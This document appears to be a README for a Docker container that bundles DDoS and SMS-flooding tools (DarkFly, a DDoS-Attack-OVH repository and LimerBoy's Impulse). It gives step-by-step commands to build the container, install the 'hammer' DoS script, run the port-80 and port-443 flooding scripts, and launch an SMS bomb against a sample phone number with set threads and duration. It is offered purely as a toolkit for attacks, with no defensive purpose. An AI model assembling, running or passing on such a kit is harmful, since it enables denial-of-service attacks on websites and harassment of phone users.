# Intro

toolbox container includes:

* https://github.com/Ranginang67/DarkFly-Tool
* https://github.com/HardyTomas/DDos-Attack-OVH-.git
* https://github.com/LimerBoy/Impulse.git

# Use

Build and login into container shell:

```shell
docker build -t toolkit -f containers/Dockerfile.toolkit .
docker run --rm --it toolkit
root@bda7c51682fb:/opt# 
```

from here several tools are at your disposal:

## DarkFly

https://telegra.ph/DDOS-sajta--DarkFly-08-11

just launch DarkFly console:

```shell
DarkFly
```

follow `1` then `16` to install `hammer` into `/root/hammer.py` 

## DDos-Attack-OVH-

https://github.com/HardyTomas/DDos-Attack-OVH-

```shell
cd DDos-Attack-OVH-
python3 80port.py
# or
python3 443port.py
```

##  LimerBoy / Impulse 

https://github.com/LimerBoy/Impulse

```shell
cd LimerBoy-Impulse
python3 impulse.py --method SMS --time 20 --threads 15 --target +380123456789
```